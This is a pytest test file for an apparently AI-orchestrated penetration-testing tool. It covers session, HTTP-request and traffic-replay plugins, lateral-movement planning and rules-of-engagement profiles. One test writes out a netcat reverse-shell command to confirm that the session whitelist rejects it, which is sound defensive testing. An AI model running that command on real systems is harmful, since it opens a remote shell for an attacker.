"""武器化插件与编排治理验收测试。

覆盖：
- session 插件：pty 命名会话（open/send/read/close/list）、白名单治理
- http_request 插件：结构化请求 + raw 模式 + scope 治理
- traffic 插件 + traffic.replay：list/replay/fuzz_param 对本地服务器的确定性回放
- 编排治理：lateral 角色、planner depends_on 贯通、fact:credential 依赖解锁、ROE profile
"""

from __future__ import annotations

import asyncio
import http.server
import json
import threading

import pytest

from secpt.traffic.store import TrafficStore, default_traffic_dir


def _run(coro):
    return asyncio.new_event_loop().run_until_complete(coro)


def _load_plugin(name: str):
    """按 plugin_loader 的方式加载单个 Python 插件，返回 (schema, fn)。"""
    import importlib.util
    from pathlib import Path

    path = Path(__file__).resolve().parents[3] / "tools" / "plugins" / f"{name}.py"
    spec = importlib.util.spec_from_file_location(f"secpt_plugin_{name}", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    schema, fn = mod.register()[name]
    return schema, fn


@pytest.fixture
def httpd():
    """127.0.0.1 上的真实 HTTP 服务器：记录请求，响应可带回显。"""
    hits: list[dict] = []

    class H(http.server.BaseHTTPRequestHandler):
        def _handle(self):
            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(length) if length else b""
            hits.append(
                {
                    "method": self.command,
                    "path": self.path,
                    "headers": dict(self.headers),
                    "body": body.decode(errors="replace"),
                }
            )
            if self.path.startswith("/echo"):
                payload = f"{self.command} {self.path} body={body.decode(errors='replace')}"
                out = payload.encode()
            elif self.path.startswith("/mark"):
                out = b"MARKER-HIT " + body[:200]
            else:
                out = b"ok"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(out)))
            self.end_headers()
            self.wfile.write(out)

        do_GET = do_POST = do_PUT = _handle

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    yield srv, hits
    srv.shutdown()


# ── session 插件 ──────────────────────────────────────────────


class TestSessionPlugin:
    def test_open_send_read_close(self):
        _, fn = _load_plugin("session")
        try:
            # cat 在白名单内，适合当回声会话
            out = _run(fn({"action": "open", "name": "t1", "command": "cat"}))
            assert "Error" not in out, out
            out = _run(
                fn(
                    {
                        "action": "send",
                        "name": "t1",
                        "data": "hello-pty\n",
                        "expect": "hello-pty",
                    }
                )
            )
            assert "hello-pty" in out
            # 游标已推进：再 read 没有新输出属正确语义
            assert _run(fn({"action": "read", "name": "t1"})) == "(无新输出)"
            # list 可见
            assert "t1" in _run(fn({"action": "list"}))
            out = _run(fn({"action": "close", "name": "t1"}))
            assert "已关闭" in out
            assert "t1" not in _run(fn({"action": "list"}))
        finally:
            _run(fn({"action": "close", "name": "t1"}))

    def test_open_rejects_non_whitelist_exe(self):
        _, fn = _load_plugin("session")
        out = _run(fn({"action": "open", "name": "bad", "command": "nc -e /bin/sh 1.2.3.4 4444"}))
        assert "Error" in out and "白名单" in out

    def test_unknown_action_errors(self):
        _, fn = _load_plugin("session")
        out = _run(fn({"action": "hack", "name": "x"}))
        assert "Error" in out


# ── http_request 插件 ─────────────────────────────────────────


class TestHttpRequestPlugin:
    def test_normal_get(self, httpd):
        srv, hits = httpd
        _, fn = _load_plugin("http_request")
        out = _run(fn({"method": "GET", "url": f"http://127.0.0.1:{srv.server_port}/a?b=1"}))
        assert "200" in out and "ok" in out
        assert hits[0]["path"] == "/a?b=1"

    def test_post_with_headers_and_body(self, httpd):
        srv, hits = httpd
        _, fn = _load_plugin("http_request")
        out = _run(
            fn(
                {
                    "method": "POST",
                    "url": f"http://127.0.0.1:{srv.server_port}/echo",
                    "headers": json.dumps({"X-Test": "abc"}),
                    "body": "k=v",
                }
            )
        )
        assert "200" in out and "k=v" in out
        assert hits[0]["headers"].get("X-Test") == "abc"

    def test_raw_mode(self, httpd):
        srv, hits = httpd
        _, fn = _load_plugin("http_request")
        port = srv.server_port
        raw_req = (
            f"GET /rawpath HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
            "X-Smuggled: a\r\nConnection: close\r\n\r\n"
        )
        out = _run(fn({"raw": True, "host": f"127.0.0.1:{port}", "body": raw_req, "tls": False}))
        assert "200" in out, out
        assert hits[0]["path"] == "/rawpath"

    def test_scope_denied(self, monkeypatch):
        monkeypatch.setenv("SECPT_SCOPE_ALLOW", "10.9.0.0/16")
        _, fn = _load_plugin("http_request")
        out = _run(fn({"method": "GET", "url": "http://192.0.2.1/x", "timeout_s": 2}))
        assert "Error" in out and ("scope" in out.lower() or "授权" in out)


# ── traffic 插件 + replay ─────────────────────────────────────


def _flow(url: str, **kw: object) -> dict:
    flow: dict = {
        "method": "GET",
        "url": url,
        "status": 200,
        "req_headers": {"Host": "example.test"},
        "req_body": b"",
        "resp_headers": {},
        "resp_body": b"ok",
        "ts": 1700000000.0,
    }
    flow.update(kw)
    return flow


@pytest.fixture
def recorded_job(tmp_path, monkeypatch):
    """录好一条交换的 job（SECPT_VAR 指向 tmp）。"""
    monkeypatch.setenv("SECPT_VAR", str(tmp_path))
    job_id = "replay-test"
    store = TrafficStore(default_traffic_dir() / f"{job_id}.sqlite")
    ex_id = store.record(_flow("http://example.test/login?user=admin"))
    store.close()
    assert ex_id == 1
    return job_id, ex_id


class TestTrafficPlugin:
    def test_list(self, recorded_job):
        job_id, _ = recorded_job
        _, fn = _load_plugin("traffic")
        out = _run(fn({"action": "list", "job_id": job_id}))
        assert "login" in out and "example.test" in out

    def test_replay_against_local_server(self, recorded_job, httpd, monkeypatch):
        job_id, ex_id = recorded_job
        srv, hits = httpd
        # 覆盖 url 指向本地服务器——replay 是确定性重建
        url = f"http://127.0.0.1:{srv.server_port}/login?user=admin"
        _, fn = _load_plugin("traffic")
        out = _run(
            fn(
                {
                    "action": "replay",
                    "job_id": job_id,
                    "exchange_id": ex_id,
                    "overrides": json.dumps({"url": url}),
                }
            )
        )
        assert "200" in out, out
        assert hits[0]["path"] == "/login?user=admin"

    def test_fuzz_param_marker(self, recorded_job, httpd, monkeypatch):
        job_id, _ex_id = recorded_job
        srv, hits = httpd
        url = f"http://127.0.0.1:{srv.server_port}/mark"
        store = TrafficStore(default_traffic_dir() / f"{job_id}.sqlite")
        store.record(
            _flow(
                url,
                method="POST",
                req_headers={"Content-Type": "application/x-www-form-urlencoded"},
                req_body=b"q=1",
            )
        )
        ex_id2 = 2
        store.close()
        _, fn = _load_plugin("traffic")
        out = _run(
            fn(
                {
                    "action": "fuzz_param",
                    "job_id": job_id,
                    "exchange_id": ex_id2,
                    "param": "q",
                    "payloads": json.dumps(["MARKER-HIT", "nothing"]),
                    "marker": "MARKER-HIT",
                }
            )
        )
        assert "★HIT" in out, out
        # 两次 payload 差分都发出去了（baseline + 2 payload 或 2 payload）
        assert len(hits) >= 2


# ── 编排治理：lateral / depends_on / fact 解锁 ────────────────


class TestOrchestrationGovernance:
    def test_lateral_role_registered(self):
        from secpt.core.orchestrator.roles import ROLE_MAP, role_stage

        assert "lateral" in ROLE_MAP
        assert "recall" in role_stage("lateral")
        assert "record_fact" in role_stage("exploit")
        assert "record_fact" in role_stage("recon")

    def test_planner_passes_depends_on(self, tmp_path, monkeypatch):
        """planner 产出的 depends_on（intent_id / fact:谓词）必须落到意图上。"""
        monkeypatch.setenv("SECPT_VAR", str(tmp_path))
        from secpt.core.orchestrator.frontier import Frontier, plan_round
        from secpt.intel.store import IntelStore

        IntelStore(tmp_path / "intel.sqlite").observe_asset("endpoint", "http://t:8000", job_id="j")

        class _L:
            async def call(self, messages, tools, model):
                body = json.dumps(
                    [
                        {
                            "title": "凭据复用",
                            "goal": "横向",
                            "done_criteria": "完成",
                            "role": "lateral",
                            "asset_scope": "http://t:8000",
                            "depends_on": "fact:credential",
                        },
                        {
                            "title": "复验",
                            "goal": "复验",
                            "done_criteria": "完成",
                            "role": "verify",
                            "asset_scope": "http://t:8000",
                            "depends_on": "intent-not-exist",
                        },
                    ]
                )
                msg = type("M", (), {"content": body})()
                return type("R", (), {"choices": [type("c", (), {"message": msg})()]})()

        fr = Frontier(tmp_path / "f.db")
        n = _run(plan_round("目标", fr, _L(), model="m", max_new=5))
        assert n == 2
        intents = fr.list_all(status="open")
        lat = [i for i in intents if i["title"] == "凭据复用"]
        assert lat, "lateral 意图应已入列"
        assert lat[0]["depends_on"] == "fact:credential"

    def test_fact_dependency_unlocks(self, tmp_path, monkeypatch):
        """depends_on=fact:credential：record_fact 前锁定、记录后解锁（确定性判定）。"""
        from types import SimpleNamespace

        monkeypatch.setenv("SECPT_VAR", str(tmp_path))
        from secpt.core.orchestrator.frontier import Frontier
        from secpt.intel.store import IntelStore

        fr = Frontier(tmp_path / "f.db")
        fr.add("横向", depends_on="fact:credential", role="lateral")
        intent = SimpleNamespace(depends_on="fact:credential")
        assert fr.deps_satisfied(intent) is False
        st = IntelStore(tmp_path / "intel.sqlite")
        st.add_node("fact", "credential:admin password=123", job_id="j")
        assert fr.deps_satisfied(intent) is True


# ── ROE 双模治理 ──────────────────────────────────────────────


class TestRoe:
    def test_profile_roe_parse(self):
        from secpt.core.profile.loader import load_profile

        assert load_profile("pentest").roe.mode == "authorized"
        assert load_profile("pentest").roe.throttle_ms > 0
        assert load_profile("ctf").roe.mode == "ctf"
        assert load_profile("ctf").roe.throttle_ms == 0

    def test_roe_unknown_mode_rejected(self, tmp_path):
        from pydantic import ValidationError

        from secpt.core.profile.loader import RoeSpec

        with pytest.raises(ValidationError):
            RoeSpec(mode="aggressive")  # type: ignore[call-arg]

    def test_run_config_roe_field(self):
        from secpt.runtime.engine import RunConfig

        assert RunConfig.__dataclass_fields__["roe_throttle_ms"].default == 0
